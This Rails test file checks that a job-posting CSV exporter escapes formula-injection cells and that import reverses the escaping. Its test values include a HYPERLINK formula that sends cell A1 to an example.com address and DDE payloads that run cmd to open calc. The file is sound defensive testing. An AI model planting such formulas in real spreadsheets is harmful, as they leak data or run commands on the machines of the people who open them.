require "test_helper"

# 書き出した CSV が、開く側で数式にならないことを検証する。
#
# 検証対象は、数式になる値へ印が付くことと、
# 取り込みで対称に取り除かれ、往復で値が変わらないことである。
class JobPostingCsvTest < ActiveSupport::TestCase
  setup do
    @owner = User.create!(email_address: "owner@example.com", password: "correct horse battery").tap(&:confirm)
    @organization = Organization.create_with_owner!(name: "サンプル株式会社", user: @owner)
  end

  test "数式になる値へ印を付ける" do
    create_job_posting(title: '=HYPERLINK("https://example.com/?"&A1,"開く")')

    assert_equal %q('=HYPERLINK("https://example.com/?"&A1,"開く")), exported_cell("title")
  end

  test "数式になる先頭の文字をすべて対象にする" do
    # 題名は前後の空白を取り除くため（ADR 0016）、タブと復帰は本文で確かめる。
    [ "=1+1", "+1", "-1+cmd|' /c calc'!A1", "@SUM(A1)" ].each do |value|
      assert_equal "'#{value}", exported_cell("title", title: value), value
    end

    [ "\tSUM(A1)", "\r=1+1" ].each do |value|
      assert_equal "'#{value}", exported_cell("description", description: value), value.inspect
    end
  end

  test "数式にならない値はそのまま出す" do
    assert_equal "ふつうの題名", exported_cell("title", title: "ふつうの題名")
  end

  test "数値の列へ印を付けない" do
    # 数値は数式になりえない。印を付けると、金額の列が文字列として読まれる。
    create_job_posting(title: "題名", annual_salary_min: 3_000_000,
                       annual_salary_max: 5_000_000, salary_currency: "JPY")

    assert_equal "3000000", exported_cell("annual_salary_min")
    assert_equal "5000000", exported_cell("annual_salary_max")
  end

  test "取り込みで印を取り除く" do
    csv.import("#{header}\nkey-1,'=1+1,本文,,,,,,,\n", performed_by: @owner)

    assert_equal "=1+1", @organization.job_postings.sole.title
  end

  test "書き出しと取り込みの往復で値が変わらない" do
    create_job_posting(title: "=1+1", external_key: "=key-1")
    exported = csv.export

    csv.import(exported, performed_by: @owner)

    job_posting = @organization.job_postings.sole

    assert_equal "=1+1", job_posting.title
    assert_equal "=key-1", job_posting.external_key
    # 印が増えないことを、2 回目の書き出しで確かめる。
    assert_equal exported, csv.export
  end

  test "印の後ろが数式の文字でなければ取り除かない" do
    # 無条件に取り除くと、`'` から始まる正当な値が壊れる。
    csv.import("#{header}\nkey-1,'たぶん引用,本文,,,,,,,\n", performed_by: @owner)

    assert_equal "'たぶん引用", @organization.job_postings.sole.title
  end

  test "取り込んだ数式の値を書き出すと印が付く" do
    # 取り込みが入口になっても、書き出しの側で無害化される。
    csv.import(%(#{header}\nkey-1,"=cmd|' /c calc'!A1",本文,,,,,,,\n), performed_by: @owner)

    assert_equal "'=cmd|' /c calc'!A1", exported_cell("title")
  end

  private
    def csv
      JobPostingCsv.new(@organization)
    end

    def header
      JobPostingCsv::COLUMNS.join(",")
    end

    def create_job_posting(title: "題名", external_key: "key-1", description: "本文", **attributes)
      @organization.job_postings.create!(
        title: title, description: description, external_key: external_key,
        status: "draft", **attributes
      )
    end

    # 書き出した CSV を読み直し、1 件目の列の値を返す。
    # 引用符の付き方は CSV の規則が決める。ここでは値そのものを見る。
    def exported_cell(column, **attributes)
      if attributes.any?
        @organization.job_postings.delete_all
        create_job_posting(**attributes)
      end

      CSV.parse(csv.export, headers: true).first.fetch(column)
    end
end
